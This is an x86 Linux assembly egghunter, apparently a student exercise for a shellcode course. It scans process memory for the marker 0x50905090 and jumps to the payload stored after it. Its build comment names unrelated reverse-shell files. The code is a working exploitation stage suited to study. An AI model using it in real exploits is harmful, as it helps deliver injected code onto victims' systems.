; Egghunter that uses 50905090 as the egg to search for.
; This was created as part of the SecurityTube Linux Assembly Expert
; course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;
; Travis Mathison
;
; The MIT License (MIT)
; 
; Copyright (c) 2018 Travis Mathison
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;
; BUILD:
; nasm -f elf32 rev_shell_asm.nasm -o rev_shell_asm.o
; ld rev_shell_asm.o -o rev_shell_asm

global _start			

section .text
_start:
    xor edx,edx         ; zero out edx

    next_page:
    or dx,0xfff         ; move to end of page

    next_byte:
    inc edx             ; increment to next byte
    lea ebx,[edx+0x4]   ; put current position +4 bytes into ebx
    push byte 0x21      ; push 33
    pop eax             ; save 33 to eax for -access- system call
    int 0x80
    cmp al,0xf2         ; check lower bytes for error code
    jz next_page        ; if access error, jump
    mov eax,0x50905090
    mov edi,edx
    scasd
    jnz next_byte
    scasd
    jnz next_byte
    jmp edi
